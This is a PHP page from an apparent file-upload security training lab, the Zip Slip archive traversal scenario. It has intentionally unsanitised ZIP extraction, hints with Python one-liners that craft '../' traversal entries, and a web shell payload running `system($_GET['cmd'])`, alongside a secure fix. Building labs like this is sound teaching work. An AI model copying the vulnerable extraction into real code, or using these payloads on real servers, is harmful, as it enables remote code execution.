<?php
// File Upload · Scenario 24 — ZIP Slip Extraction
// This page is self-contained: validation, description, hint, verdict, and storage.

$pageTitle = 'Zip Slip via Archive Upload (Directory Traversal)';
$scenarioNumber = 24;
$nextScenario = sprintf('../scenario%02d/', 25);
$uploadsDir = __DIR__ . '/uploads';
if (!is_dir($uploadsDir)) {
    mkdir($uploadsDir, 0775, true);
}

$labDescription = [
    'Archive extraction does not sanitize entry names.',
    'Entry like ../../shell.php writes outside extract directory (Zip Slip).',
    'Server extracts ZIP and writes files with path from ZIP entry name.',
    'Goal: Create ZIP with ../../shell.php entry.',
];

$labHint = [
    'Create malicious ZIP: entry name should be ../../shell.php or ../shell.php.',
    'Use Python: import zipfile; z=zipfile.ZipFile(\'evil.zip\',\'w\'); z.writestr(\'../../../../var/www/shell.php\',\'<?php echo pwned; ?>\'); z.close()',
    'Or use: z.writestr(\'../../shell.php\',\'<?php echo pwned; ?>\')',
    'Upload evil.zip via form. Use Burp Proxy.',
    'Server extracts and writes file outside uploads folder.',
    'Then GET /scenario24/shell.php or /scenario24/uploads/../shell.php',
    'Standard: Zip Slip / Archive Path Traversal (CVE-2018-1263).',
];

$labRootCause = [
    'cwe' => 'CWE-22: Zip Slip',
    'owasp' => 'OWASP: Archive Path Traversal',
    'bad' => [
        'explanation' => [
        '<strong>Programmer extracted ZIP without checking entry names.</strong> ZIP entry can have name ../../shell.php and extraction writes outside target folder.',
        '<strong>Mistake:</strong> Used $zip->extractTo(\'uploads/\') without sanitizing entry names. ZIP entry name is controlled by attacker and can contain ../.',
        '<strong>Why it happens:</strong> Developer did not know ZIP entry names can contain path traversal.',
        ],
        'code' => [
        '// VULNERABLE - Zip Slip!',
        '<?php',
        '$zip = new ZipArchive();',
        '$zip->open($_FILES[\'file\'][\'tmp_name\']);',
        '$zip->extractTo(\'uploads/\'); // Extracts all entries without checking names! DANGER!',
        '$zip->close();',
        '?>',
        '// Attacker creates evil.zip with entry: ../../shell.php',
        '// Python: import zipfile; z=zipfile.ZipFile(\'evil.zip\',\'w\'); z.writestr(\'../../shell.php\',\'<?php system($_GET["cmd"]); ?>\');',
        '// When server extracts to uploads/, it writes uploads/../../shell.php = shell.php outside uploads!',
        ],
        'impact' => 'Attacker creates ZIP with ../../shell.php entry and writes file outside uploads folder, can overwrite config or write shell in executable path. Gets RCE. Zip Slip is critical.',
    ],
    'good' => [
        'explanation' => [
        '<strong>Fix:</strong> Check each entry name in ZIP before extraction. Reject if contains ../ or ..\\ or absolute path. Use basename() for entry name.',
        '<strong>Rule:</strong> Validate ZIP entry names like you validate filename.',
        ],
        'code' => [
        '// SECURE - Check ZIP entry names',
        '<?php',
        '$zip = new ZipArchive();',
        '$zip->open($_FILES[\'file\'][\'tmp_name\']);',
        'for ($i=0; $i<$zip->numFiles; $i++) {',
        '  $entryName = $zip->getNameIndex($i);',
        '  if (strpos($entryName, \'../\') !== false || strpos($entryName, \'..\\\\\') !== false) {',
        '    die(\'Path traversal in ZIP entry: \' . $entryName);',
        '  }',
        '  if (strpos($entryName, \'/\') === 0 || preg_match(\'/^[a-zA-Z]:/\', $entryName)) {',
        '    die(\'Absolute path not allowed\');',
        '  }',
        '  $safeName = basename($entryName);',
        '  if ($safeName != $entryName) { die(\'Only files, no folders with path\'); }',
        '}',
        '$zip->extractTo(\'uploads/\');',
        '$zip->close();',
        '?>',
        ],
        'steps' => [
        'Check each ZIP entry name before extraction',
        'Reject if entry contains ../ or ..\\',
        'Reject absolute paths like /etc/passwd or C:\\',
        'Use basename() to get only filename',
        'Whitelist allowed extensions for entries',
        'Limit number of files and total uncompressed size',
        'Extract to quarantine first, then validate, then move to public',
        'Use library that handles Zip Slip automatically',
        ],
    ],
];

$link = null;
$linkLabel = 'Open the uploaded file';
$extraOutput = null;
$flash = null; // ['kind' => 'ok'|'info'|'fail', 'title' => ..., 'body' => ...]

$file = isset($_FILES['fileToUpload']) ? $_FILES['fileToUpload'] : null;
if (isset($file) && $file['name'] !== '') {
    if (!class_exists('ZipArchive')) {
        http_response_code(500);
        $flash = ['kind' => 'fail', 'title' => 'ZIP support unavailable', 'body' => 'Use the Dockerfile for this lab.'];
    } elseif ($file['error'] !== UPLOAD_ERR_OK) {
        $flash = ['kind' => 'fail', 'title' => 'Upload failed', 'body' => 'The archive was not received.'];
    } else {
        $zip = new ZipArchive();
        if ($zip->open($file['tmp_name']) !== true) {
            http_response_code(422);
            $flash = ['kind' => 'fail', 'title' => 'Invalid archive', 'body' => 'The file is not a readable ZIP archive.'];
        } else {
            $extractRoot = $uploadsDir . '/extracted';
            mkdir($extractRoot, 0775, true);
            for ($i = 0; $i < $zip->numFiles; $i++) {
                $entry = $zip->getNameIndex($i);
                $target = $extractRoot . '/' . $entry;
                if (substr($entry, -1) === '/') {
                    mkdir($target, 0775, true);
                    continue;
                }
                mkdir(dirname($target), 0775, true);
                $stream = $zip->getStream($entry);
                if ($stream !== false) {
                    file_put_contents($target, stream_get_contents($stream));
                    fclose($stream);
                }
            }
            $zip->close();
            $proof = __DIR__ . '/proof.php';
            if (is_file($proof) && (strpos((string) file_get_contents($proof), 'ZIPSLIP_OK') !== false || strpos((string) file_get_contents($proof), '<?php') !== false)) {
                $link = 'proof.php';
                $flash = ['kind' => 'ok', 'title' => 'Congratulations! You solved Scenario 24.', 'body' => 'The ZIP entry escaped the extraction folder and wrote proof.php into the scenario directory.'];
            } else {
                http_response_code(422);
                $flash = ['kind' => 'fail', 'title' => 'Extraction stayed inside', 'body' => 'Use a directory traversal entry such as ../../proof.php to escape the extraction folder.'];
            }
        }
    }
}

if ($flash !== null && ($flash['kind'] ?? '') === 'fail' && http_response_code() === 200) {
    http_response_code(422);
}
?>
<!DOCTYPE html>
<html lang="en">
<?php include __DIR__ . '/../menu/header.php'; ?>
<body>
<?php include __DIR__ . '/../menu/navbar.php'; ?>

    <main class="bench">
        <span class="num">File Upload · SCENARIO 24 · UPLOAD</span>
        <h1>Zip Slip (Archive Traversal)</h1>
        <p>ZIP entry with ../../ escapes extraction dir. Create malicious ZIP with Python and upload via Burp.</p>

        <div class="panel upload-form">
            <h2>Upload a ZIP archive</h2>
            <form action="" method="POST" enctype="multipart/form-data">
                <label for="fileToUpload">Select a ZIP:</label>
                <input type="file" name="fileToUpload" id="fileToUpload" accept=".zip,application/zip" />
                <button class="primary-button" type="submit">Extract archive</button>
            </form>
        </div>

        <?php if ($flash !== null): ?>
            <div class="flash <?= $flash['kind'] ?>" role="status">
                <strong><?= htmlspecialchars($flash['title'], ENT_QUOTES) ?></strong>
                <?= htmlspecialchars($flash['body'], ENT_QUOTES) ?>
            </div>
        <?php endif; ?>

        <?php if ($extraOutput !== null): ?>
            <pre class="panel hint-code" aria-label="Parser output"><?= htmlspecialchars($extraOutput, ENT_QUOTES) ?></pre>
        <?php endif; ?>

        <?php if ($flash !== null && ($flash['kind'] ?? '') === 'ok' && $nextScenario !== null): ?>
            <div class="next-scenario">
                <a class="primary-button" href="<?= htmlspecialchars($nextScenario, ENT_QUOTES) ?>" target="_blank" rel="noopener">Next scenario &rarr;</a>
            </div>
        <?php endif; ?>

        <?php if ($link !== null): ?>
            <p class="notice ok"><a href="<?= htmlspecialchars($link, ENT_QUOTES) ?>" target="_blank" rel="noopener"><?= htmlspecialchars($linkLabel, ENT_QUOTES) ?></a></p>
        <?php endif; ?>
    </main>

<?php include __DIR__ . '/../menu/footer.php'; ?>
</body>
</html>
